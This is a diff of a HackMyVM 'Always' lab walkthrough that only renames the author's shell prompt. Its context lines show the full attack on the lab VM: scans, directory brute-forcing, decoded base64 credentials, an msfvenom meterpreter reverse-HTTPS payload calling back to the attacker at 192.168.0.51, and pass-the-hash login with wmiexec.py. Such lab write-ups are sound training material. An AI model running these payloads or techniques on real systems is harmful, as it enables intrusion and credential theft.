@@ -5,14 +5,14 @@
 ### ARP Scan
 
 ```bash
-gareth@gareth:~/hackmyvm/always$ sudo arp-scan -l | grep db
+garffff@garffff:~/hackmyvm/always$ sudo arp-scan -l | grep db
 192.168.0.72	08:00:27:b2:fe:db	PCS Systemtechnik GmbH
 ```
 
 ### Nmap Scan - TCP
 
 ```bash
-gareth@gareth:~/hackmyvm/always$ sudo nmap -p- -sV -sC 192.168.0.72 -oA nmap/always.tcp
+garffff@garffff:~/hackmyvm/always$ sudo nmap -p- -sV -sC 192.168.0.72 -oA nmap/always.tcp
 Starting Nmap 7.80 ( https://nmap.org ) at 2024-10-31 10:55 GMT
 Nmap scan report for 192.168.0.72
 Host is up (0.00047s latency).
@@ -77,7 +77,7 @@ Looking at port 80, not much going on here:
 Doing a directory bruteforce, we see a hidden directory called Admin:
 
 ```bash
-gareth@gareth:~/hackmyvm/always$ feroxbuster -u http://192.168.0.72:8080/ -w /opt/SecLists/Discovery/Web-Content/big.txt -x .php,.txt,.html
+garffff@garffff:~/hackmyvm/always$ feroxbuster -u http://192.168.0.72:8080/ -w /opt/SecLists/Discovery/Web-Content/big.txt -x .php,.txt,.html
 
  ___  ___  __   __     __      __         __   ___
 |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
@@ -136,7 +136,7 @@ Looking at `admin_notes.html` file, we have text encoded in base64:
 Decoding this string there is a username and password for the FTP service:
 
 ```bash
-gareth@gareth:~/hackmyvm/always$ echo -n 'ZnRwdXNlcjpLZWVwR29pbmdCcm8hISE=' | base64 -d
+garffff@garffff:~/hackmyvm/always$ echo -n 'ZnRwdXNlcjpLZWVwR29pbmdCcm8hISE=' | base64 -d
 ftpuser:KeepGoingBro!!!
 ```
 
@@ -145,7 +145,7 @@ Logging into FTP service there is a new file that points to a hidden file on the
 ```bash
 Connected to 192.168.0.72.
 220 Microsoft FTP Service
-Name (192.168.0.72:gareth): ftpuser
+Name (192.168.0.72:garffff): ftpuser
 331 Password required for ftpuser.
 Password: 
 230 User logged in.
@@ -164,7 +164,7 @@ local: robots.txt remote: robots.txt
 56 bytes received in 00:00 (749.14 KiB/s)
 ftp> exit
 221 Goodbye.
-gareth@gareth:~/hackmyvm/always/ftp$ cat robots.txt 
+garffff@garffff:~/hackmyvm/always/ftp$ cat robots.txt 
 User-agent: *
 Disallow: /admins-secret-pagexxx.html
 ```
@@ -176,7 +176,7 @@ Looking at the file, there is another base64 string:
 We have a new set of credentials:
 
 ```bash
-gareth@gareth:~/hackmyvm/always$ echo -n 'WW91Q2FudEZpbmRNZS4hLiE=' | base64 -d
+garffff@garffff:~/hackmyvm/always$ echo -n 'WW91Q2FudEZpbmRNZS4hLiE=' | base64 -d
 YouCantFindMe.!.!
 ```
 
@@ -185,8 +185,8 @@ This password does not work on any service. Suspect it is a box issue
 Login into the VM directly as the ftpuser works. Do get a shell, I used the following msfvenom:
 
 ```bash
-gareth@gareth:~/hackmyvm/always$ sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.51 LPORT=443 -f exe > shell.exe
-[sudo] password for gareth:            
+garffff@garffff:~/hackmyvm/always$ sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.51 LPORT=443 -f exe > shell.exe
+[sudo] password for garffff:            
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x64 from the payload
 No encoder specified, outputting raw payload
@@ -197,8 +197,8 @@ Final size of exe file: 7168 bytes
 Setting up Meterpreter:
 
 ```bash
-gareth@gareth:~/hackmyvm/always$ sudo msfconsole -q -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set LHOST 192.168.0.51;set LPORT 443;run;"
-[sudo] password for gareth:            
+garffff@garffff:~/hackmyvm/always$ sudo msfconsole -q -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set LHOST 192.168.0.51;set LPORT 443;run;"
+[sudo] password for garffff:            
 [*] Using configured payload generic/shell_reverse_tcp
 payload => windows/x64/meterpreter/reverse_https
 LHOST => 192.168.0.51
@@ -213,8 +213,8 @@ Navigating to my webserver and loading the shell.exe:
 Gave me a reverse connection:
 
 ```bash
-gareth@gareth:~/hackmyvm/always$ sudo msfconsole -q -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set LHOST 192.168.0.51;set LPORT 443;run;"
-[sudo] password for gareth:            
+garffff@garffff:~/hackmyvm/always$ sudo msfconsole -q -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set LHOST 192.168.0.51;set LPORT 443;run;"
+[sudo] password for garffff:            
 [*] Using configured payload generic/shell_reverse_tcp
 payload => windows/x64/meterpreter/reverse_https
 LHOST => 192.168.0.51
@@ -360,7 +360,7 @@ Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 Logging on as administrator and grabbing the root flag:
 
 ```bash
-gareth@gareth:~/hackmyvm/always$ wmiexec.py administrator@192.168.0.72 -hashes :16cbb99ac5e376eac08af2a41e651962
+garffff@garffff:~/hackmyvm/always$ wmiexec.py administrator@192.168.0.72 -hashes :16cbb99ac5e376eac08af2a41e651962
 Impacket v0.11.0 - Copyright 2023 Fortra
 
 [*] SMBv2.1 dialect used
